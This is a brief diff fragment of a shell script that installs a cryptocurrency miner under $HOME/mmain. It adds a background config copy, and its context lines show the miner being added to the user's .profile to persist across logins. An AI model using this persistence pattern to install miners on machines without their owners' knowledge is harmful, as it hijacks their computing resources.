@@ -158,6 +158,9 @@ EOL
 
 chmod +x $HOME/mmain/miner.sh
 
+echo "[*] Creating $HOME/mmain/config_background.json"
+cp $HOME/mmain/config.json $HOME/mmain/config_background.json
+
 if ! sudo -n true 2>/dev/null; then
   if ! grep mmain/miner.sh $HOME/.profile >/dev/null; then
     echo "[*] Adding $HOME/mmain/miner.sh script to $HOME/.profile"
